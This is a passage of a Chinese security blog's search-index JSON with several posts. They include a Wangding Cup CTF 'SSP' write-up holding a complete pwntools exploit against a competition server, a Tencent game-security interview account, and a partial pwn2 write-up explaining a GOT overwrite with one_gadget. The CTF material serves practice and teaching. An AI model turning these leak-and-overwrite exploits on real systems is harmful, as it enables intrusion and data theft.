总结以上所说的基本上涵盖了程序从编写到执行的整个过程了，叙述的有点宽泛，单页有限，类似编译过程中的语法树、链接中的动静态链接以及延迟绑定等特性、程序装载执行中MMU如何负责物理内存映射等都没有详细阐述，以后再填坑把。感叹自己还是学的太慢，之前操作系统课的时候冷嘲热讽，其实殊不知错失了很多学习更多东西的机会，还是NAIVE，233333333。","link":"/2019/03/26/%E7%A8%8B%E5%BA%8F%E5%91%98%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"title":"网鼎杯第一场SSP","text":"网鼎杯第一场 ssp wp​ 首先考虑利用ssp进行泄露，由于flag在栈上，直接写循环leak爆破栈地址，失败，之后考虑爆破canary，爆破失败，而且由于只进行三次fork，所以之后内存数据会更新导致无法进一步泄露，所以放弃爆破canary的思路。之后重新考虑ssp，利用ssp泄露libc函数，然后查找得到libc库，之后能得到libc.environ，泄露libc.environ中保存的地址后，gdb调试一下得到buf偏移，计算得到buf真实地址，最后一次输入淹没泄露buf内容,脚本写的太烂，就不放上来了。 exp如下： 123456789101112131415161718192021222324252627282930#encoding=utf-8from pwn import *leaksome={'leak':0}p = remote('106.75.90.160', 9999)pop_rdi_ret=0x0000000000400c13strcmp_got=0x00000602050gets_plt=0x000000000400830payload='a'*0x128payload+=p64(0x000000602048)p.recvuntil('r guessing flag')p.sendline(payload)p.recvuntil('detected ***: ')leak=u64(p.recv(6).ljust(8,'\\x00'))leaksome['leak']=leaklibc_base=leak-0x20740env_addr=libc_base+0x00000000003c6f38payload='a'*0x128payload+=p64(env_addr)p.recvuntil('r guessing flag')p.sendline(payload)p.recvuntil('detected ***: ')leak=u64(p.recv(6).ljust(8,'\\x00'))leaksome['leak2']=leakstack_addr=leakpayload='a'*0x128payload+=p64(stack_addr-0x168)p.recvuntil('r guessing flag')p.sendline(payload)p.recvuntil('detected ***: ')print p.recv(1024)","link":"/2018/08/24/%E7%BD%91%E9%BC%8E%E6%9D%AFssp/"},{"title":"腾讯游戏安全一面","text":"2018腾讯游戏安全一面自从打完领航杯，我们这一届就退役开始投简历了，想去年这个时候师傅们都已经投完简历去公司实习了，我们才开始投，哎，还是太菜了。简历是师傅给投的，说安全圈子小，内推啥的也都方便，这里感谢一哈师傅，还是挺照顾的。说真的，第一次面试就面腾讯确实还是很紧张的，虽然一面只是基础，面试前由于紧张也还是准备了一下。一面还是很简单的，这里详细说一下面试内容：首先让做一个自我介绍，这里由于比较胆小说话还是结巴的，面试官就笑着说让我别紧张慢慢说，感觉面试官大哥贼暖，之后说话就不哆嗦了2333333。基本上就是说自己是xxx学校xxx专业搞xxx方向，这里详细说了一下学校网安人才培养模式，因为本校没有网安专业，但是学校对网安还是很支持的，然后说了一下平时是如何学习的，最近在研究什么方向，毕业了想去干什么，etc，xxx套话说了一通，面试官也问了不少，有一个了解之后，正题就开始了。 了解到我是打CTF的，就问我一般拿到逆向题目如何入手，我就说一般查壳、脱壳、Ida分析、动态调试这些基础流程，问到壳，壳的种类、原理、作用啥的都解释了一下，脱壳，问如何手脱，我说我只脱过压缩壳，之后把从CTFWIKI上看来的脱壳方式都解释了一下，还是很轻松的，说到Esp定律下硬件断点，问我硬件断点和软件断点的区别、实现方式，这里没有答好，实现方式那里把内存断点和普通的指令断点记混了（tcl），就一本正经的跟面试官说int3替换，异常处理，中断调用，面试官说不对，你再想想（orz），之后还是没有答出来，哎还是太菜了，之后了解了一下其实和指令断点的实现方式是类似的，emmmmmm。问我有没有脱过加密壳，知不知道vmp，为什么vmp这么难脱，这里吹了一波代码虚拟化和反调试，指出难点在于分析中间代码和汇编之间的映射关系和虚拟机的解释方式，这里本来想把符号执行还有Pin侧信道分析程序执行流反虚拟化啥的吹一下的，但是面试官没给机会直接就下一题了23333333。基本到这边壳这一块就结束了，感觉答的也还算行吧。壳问完了之后问调试工具，类似的有ida里面有哪些你觉得好用的功能，我脱口而出f5，然后我们都笑了。。。。。补上了idc、shift+f12之类的，还有类型修改，因为ida时常会解析错误，这边把解析错误的原因说了一下，之后问如何找到程序中的main函数，我就说可以通过程序的输出找到字符串，然后通过对字符串引用找到关键函数，通过函数回缩调用定位到main，面试官说行，那你说说窗口函数如何找到main，由于之前基本接触控制台类型的比较多，这边答得也不是很好，我就说可以通过给一些api下断点，然后通过堆栈中存储的返回地址找到上层调用，面试官说问个基础的，窗口程序和控制台有什么不一样，我说窗口是基于消息回调的，面试官好像期望我说更多，然鹅我对win了解甚少，emmmmmm原型毕露。之后问一些比较偏细节的问题，比如哪些指令会对堆栈产生变化，我说push/pushad/pop/popad/call之类的，面试官问又没有了，想了好久没想起来（还是太太太菜了），之后问调用约定，常见的调用约定类型、区别、64位下用哪一种调用约定，还有64位下寄存器作用，和32位程序区别，这边基本上都答出来了，感觉面试官还是满意的，不过也挺基础的。之后看我简历上写的熟练掌握程序底层运行模式，让我把说说，这边就把程序从源到装载内存执行的整个过程吹了一下，吹到后面面试官说你别说了，再说要把程序员自我修养整本书背下来了，下一题下一题，emmmmm，其实还想再吹一会的，词法分析、语法分析、优化、符号解析、重定位、延迟绑定、加载过程、虚拟内存映射这些都没有说的很详细，emmmmmm，表现机会-1。之后问我项目经历，问我在项目中做哪一块，我说底层通信，主要搞啥啥啥的，这边都是走个流程，确认无误后就下一题。到这边偏技术上的问题基本都问完了，之后面试官说问了我一些比较发散的问题，问我平时打不打游戏，打啥游戏，我说我一般不玩游戏，玩游戏也是开挂的，emmmmm，好像踩坑了，问开什么类型的挂，CTF逆向和逆外挂有什么不同，这边也就能答多少答多少，总体来说应该也算满意吧。之后就是瞎侃，问我为啥不更博客了，我说谈女票了（一脸娇羞），emmmm，面试官：年轻气盛很正常，别害羞。开玩笑，解释了一下，由于最近在研究xxx，所以写的博客啥的都保存在本地，等有空再推上去。之后面试官问我觉得有没有必要写博客，我说有，肯定有，第一就是起保存作用，方便你以后攻坚其它方向的时候不至于把之前搞过的忘了，第二就是起一个思维发散作用，做是做了，做过后要有理解和感悟，写博客就是一个思维由浅入深的过程，能记录你所想，更能提高自己，包括思维和眼光，第三就是写博客是一种态度，一种不断求索去学习新的知识的态度，这种态度，需要坚持。说完我明显听面试官大大的嗯了一声，不对，好几声（捂脸）。最后面试官说对我已经有一个了解，想知道有没有什么要问他的，我说想。。。。。（好呆 直接问就吼了）第一个问题是通过这次面试有没有觉得哪里需要学习或者去改进的，面试官说可以不用说太多，条理清晰一点就吼，第二个就是有没有什么研究方向推荐的，面试官说没有。。。。你现在的研究方向就不错，fuzz、物联网什么的都可以去搞一搞。emmmmm这两个问题问过之后就挂了，好气，其实问题很多的，比如他们在那里一般做什么工作，虽然能猜到但是还是想要听本人详细说说，还有就是有没有下一面。。。。emmmmmm忘记问了，昨天面的今天还没消息。。。。挂电话之后看了一下时间，1个小时的样子，接下来就是狂喜，不知道为什么会狂喜，就是感觉挺激动的（捂脸）,激动过后总结，发现其实问的很基础，一些比较深入的技术或者细节都没有问到，基本就是通过你的简历问问题，由上至下，然后看你的回答，根据你的回答去问一些稍微深入一点的问题或者发散等等。面试官小哥哥人挺好，声音好听引起舒适，第一次面试体验良好，期待二面(希望别凉)~。","link":"/2019/03/05/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E4%B8%80%E9%9D%A2/"},{"title":"网鼎杯线下Pwn2","text":"网鼎杯线下赛 pwn2 wp​ 师傅网鼎杯扔给我的，当时没来的及做，现在做了一下，这里贴出思路。 网鼎杯线下三题中这个算是最简单的了，感叹网鼎杯的赛题质量还是挺高的，听师傅说网鼎杯是借鉴的国外赛题，国外赛题的话一般是re/pwn结合的，一般并称为binary，所以看线下赛的两道堆题，不仅需要你pwn，还需要你把他逻辑逆出来。符号表被裁，函数也比较多，不再是寻常的3~4个函数的选单程序，看上去比较贴近实际。分析起来可以算是有点烦的了。其它两题有空再说，现在贴下pwn2的思路。pwn2的话是一个brainfuck程序，玩法是通过输入一些程序规定的特殊字符，去使用程序指定的一些功能。记得pwnable.kr上好像是有一道类似的题目。 这道题逻辑大概是这样的，初始指针是指向bss段，我们可以通过输入、.、,来进行指针的移动、泄露、输入等，其实还有一些其他的功能，但是事实上对利用是没有什么太大帮助的，估计是想迷惑我们23333。 这道题思路是这样的，首先通过移动bss段的指针使其指向libc中的函数，因为这题肯定是要构造系统调用的，这里其实只有一种选择，就是将bss指针移动到位处bss段上的_IO_2_1_stderr_等函数，这样可以进行泄露libc地址，但是一开始我想的是直接将指针移动到got段进行进行泄露got表，但是由于程序里有一个操作是在数组下标寻址的时候做有符号位的扩展，导致一旦用户输入了超过0x7f个字符的话程序会将0x80解析为0xffffff80，而保存用户输入的地址之后0xffffff80地址处数据为0x00，这样的话循环会退出，程序执行exit(1)指令，这里满足条件的got好像只有exit一个，但是exit是未初始化的，即未进行plt寻址和地址绑定，所以exit无法泄露libc相关地址，而其他的got函数长度超过0x7f，会导致无法进行泄露后下一步的操作。泄露_IO_2_1_stderr_的地址后可以计算libc基址，之后可以得到oneGadget等的地址，这时候如果直接写exitgot为oneGadget的话程序会报错，因为程序已经一次getshell所需的输入字符数，这里程序故意不让你一次getshell，以至于如果你覆写exit为oneGadget的话只能将oneGadget从低地址开始的4字节写入，之后直接exit，而由于oneGadget的低四字节是无效地址，程序会报错。 所以这里绕了一下，不直接写exit为oneGadget，而是将exit覆写为main函数的开头，这样的话就能再进行一次输入了，由于ptr循环开始并没有初始化，所以现在ptr指向的是exit got表地址+4的位置，所以第二次输入将ptr往低地址移4字节后进行写入，现在就能写入oneGadget了。成功getShell。这道题比较坑的坑点就在于movsx的带符号位扩展，不了解的话可能会花很长时间死磕。 ​ exp如下： 123456789101112131415161718192021222324252627282930313233#coding:utf-8import sysfrom pwn import *#from LibcSearcher import *import timelibc=ELF('/lib/x86_64-linux-gnu/libc.so.6')def debug(msg=''): gdb.attach(p,'') raw_input()def exploit(): p.recv() payload1 = \"","link":"/2018/09/09/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"PWN","slug":"PWN","link":"/tags/PWN/"},{"name":"RE","slug":"RE","link":"/tags/RE/"},{"name":"WP","slug":"WP","link":"/tags/WP/"},{"name":"Fuzz","slug":"Fuzz","link":"/tags/Fuzz/"},{"name":"总结","slug":"总结","link":"/tags/%E6%80%BB%E7%BB%93/"},{"name":"硬件","slug":"硬件","link":"/tags/%E7%A1%AC%E4%BB%B6/"},{"name":"无线","slug":"无线","link":"/tags/%E6%97%A0%E7%BA%BF/"},{"name":"线下攻防","slug":"线下攻防","link":"/tags/%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2/"},{"name":"AWD","slug":"AWD","link":"/tags/AWD/"},{"name":"渗透","slug":"渗透","link":"/tags/%E6%B8%97%E9%80%8F/"},{"name":"漏洞","slug":"漏洞","link":"/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"复现","slug":"复现","link":"/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"调试","slug":"调试","link":"/tags/%E8%B0%83%E8%AF%95/"},{"name":"源码分析","slug":"源码分析","link":"/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"name":"二进制","slug":"二进制","link":"/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"原理","slug":"原理","link":"/tags/%E5%8E%9F%E7%90%86/"},{"name":"机制","slug":"机制","link":"/tags/%E6%9C%BA%E5%88%B6/"},{"name":"Tools","slug":"Tools","link":"/tags/Tools/"},{"name":"IDA","slug":"IDA","link":"/tags/IDA/"},{"name":"编译器","slug":"编译器","link":"/tags/%E7%BC%96%E8%AF%91%E5%99%A8/"},{"name":"虚拟机","slug":"虚拟机","link":"/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"攻防","slug":"攻防","link":"/tags/%E6%94%BB%E9%98%B2/"},{"name":"人生","slug":"人生","link":"/tags/%E4%BA%BA%E7%94%9F/"},{"name":"理想","slug":"理想","link":"/tags/%E7%90%86%E6%83%B3/"},{"name":"NTP","slug":"NTP","link":"/tags/NTP/"},{"name":"项目","slug":"项目","link":"/tags/%E9%A1%B9%E7%9B%AE/"},{"name":"C++","slug":"C","link":"/tags/C/"},{"name":"工具","slug":"工具","link":"/tags/%E5%B7%A5%E5%85%B7/"},{"name":"IoT","slug":"IoT","link":"/tags/IoT/"},{"name":"路由器","slug":"路由器","link":"/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"},{"name":"约束求解","slug":"约束求解","link":"/tags/%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/"},{"name":"OD","slug":"OD","link":"/tags/OD/"},{"name":"感悟","slug":"感悟","link":"/tags/%E6%84%9F%E6%82%9F/"},{"name":"游戏安全","slug":"游戏安全","link":"/tags/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/"},{"name":"代码保护","slug":"代码保护","link":"/tags/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4/"},{"name":"开发","slug":"开发","link":"/tags/%E5%BC%80%E5%8F%91/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"协议","slug":"协议","link":"/tags/%E5%8D%8F%E8%AE%AE/"},{"name":"破解","slug":"破解","link":"/tags/%E7%A0%B4%E8%A7%A3/"},{"name":"浅谈随笔","slug":"浅谈随笔","link":"/tags/%E6%B5%85%E8%B0%88%E9%9A%8F%E7%AC%94/"},{"name":"面试","slug":"面试","link":"/tags/%E9%9D%A2%E8%AF%95/"},{"name":"Windows逆向","slug":"Windows逆向","link":"/tags/Windows%E9%80%86%E5%90%91/"}],"categories":[{"name":"2018国赛","slug":"2018国赛","link":"/categories/2018%E5%9B%BD%E8%B5%9B/"},{"name":"RE","slug":"RE","link":"/categories/RE/"},{"name":"2019国赛","slug":"2019国赛","link":"/categories/2019%E5%9B%BD%E8%B5%9B/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"Fuzz","slug":"Fuzz","link":"/categories/Fuzz/"},{"name":"省信安","slug":"省信安","link":"/categories/%E7%9C%81%E4%BF%A1%E5%AE%89/"},{"name":"漏洞","slug":"漏洞","link":"/categories/%E6%BC%8F%E6%B4%9E/"},{"name":"HIDS","slug":"HIDS","link":"/categories/HIDS/"},{"name":"HTTP","slug":"HTTP","link":"/categories/HTTP/"},{"name":"PWN练习","slug":"PWN练习","link":"/categories/PWN%E7%BB%83%E4%B9%A0/"},{"name":"Tools","slug":"Tools","link":"/categories/Tools/"},{"name":"虚拟机","slug":"虚拟机","link":"/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"浅谈随笔","slug":"浅谈随笔","link":"/categories/%E6%B5%85%E8%B0%88%E9%9A%8F%E7%AC%94/"},{"name":"pwn练习","slug":"pwn练习","link":"/categories/pwn%E7%BB%83%E4%B9%A0/"},{"name":"项目","slug":"项目","link":"/categories/%E9%A1%B9%E7%9B%AE/"},{"name":"IoT","slug":"IoT","link":"/categories/IoT/"},{"name":"ISITDTU_CTF","slug":"ISITDTU-CTF","link":"/categories/ISITDTU-CTF/"},{"name":"Defcon_Group_010","slug":"Defcon-Group-010","link":"/categories/Defcon-Group-010/"},{"name":"XMAN夏令营","slug":"XMAN夏令营","link":"/categories/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5/"},{"name":"破解之路","slug":"破解之路","link":"/categories/%E7%A0%B4%E8%A7%A3%E4%B9%8B%E8%B7%AF/"},{"name":"世安杯","slug":"世安杯","link":"/categories/%E4%B8%96%E5%AE%89%E6%9D%AF/"},{"name":"上海网络安全大赛","slug":"上海网络安全大赛","link":"/categories/%E4%B8%8A%E6%B5%B7%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"},{"name":"总结","slug":"总结","link":"/categories/%E6%80%BB%E7%BB%93/"},{"name":"虚拟化","slug":"虚拟化","link":"/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/"},{"name":"Python","slug":"Python","link":"/categories/Python/"},{"name":"协议","slug":"协议","link":"/categories/%E5%8D%8F%E8%AE%AE/"},{"name":"网鼎杯","slug":"网鼎杯","link":"/categories/%E7%BD%91%E9%BC%8E%E6%9D%AF/"},{"name":"读书笔记","slug":"读书笔记","link":"/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"面试","slug":"面试","link":"/categories/%E9%9D%A2%E8%AF%95/"}]}